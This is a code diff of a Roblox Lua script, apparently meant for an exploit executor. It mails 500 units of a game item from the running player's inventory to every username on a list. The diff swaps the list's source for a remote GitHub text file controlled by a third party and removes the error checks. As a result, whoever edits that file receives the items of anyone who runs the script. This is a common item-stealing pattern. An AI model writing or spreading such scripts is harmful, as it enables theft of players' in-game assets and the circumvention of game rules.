@@ -1,27 +1,13 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-
 local itemname = "Corrupted Huge Bait"
-local classname = "Consumable"
+local classname = "Consumable"  -- String needs to be in quotes
 local totalitem = 500
--- Fetch usernames from the server
-local fetchUsernamesFunction = ReplicatedStorage:WaitForChild("FetchUsernames")
-local usernamesString = fetchUsernamesFunction:InvokeServer()
 
+local usernamesString = game:HttpGet("https://raw.githubusercontent.com/recyaza23/pgo/refs/heads/main/username.txt")
 local usernames = {}
-if usernamesString then
-    for line in usernamesString:gmatch("([^\n]*)\n?") do
-        if line ~= "" then
-            table.insert(usernames, line)
-        end
-    end
-else
-    warn("Failed to fetch usernames. Proceeding with an empty list.")
+for line in usernamesString:gmatch("([^\n]+)") do
+    table.insert(usernames, line)
 end
 
--- Function to send mail
 local function sendMail(username, item, id, amount)
     local args = {
         [1] = username,
@@ -34,11 +20,17 @@ local function sendMail(username, item, id, amount)
     wait(0.5)
 end
 
--- Function to get item ID
+
+local RS = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local Save = require(RS.Library.Client.Save)
+
 local function GetItemID()
     local data = Save.Get()
     local inventory = data and data.Inventory
-    if inventory and inventory[classname] then
+    -- Use classname variable instead of hardcoding it
+    if inventory and inventory[classname] then  -- Use [] notation to access with variable
         for uid, itemData in pairs(inventory[classname]) do
             if itemData.id == itemname then
                 return uid
@@ -47,14 +39,8 @@ local function GetItemID()
     end
     return nil
 end
-
--- Get the item ID and send mail to each username
 local result = GetItemID()
-if result then
-    for _, username in pairs(usernames) do
-        sendMail(username, "Currency", result, totalitem) -- Send gems
-        wait(1) -- Delay between sending
-    end
-else
-    warn("Item ID not found for " .. itemname)
+for _, username in pairs(usernames) do
+    sendMail(username, "Currency", result, totalitem)--gems
+    wait(1)
 end
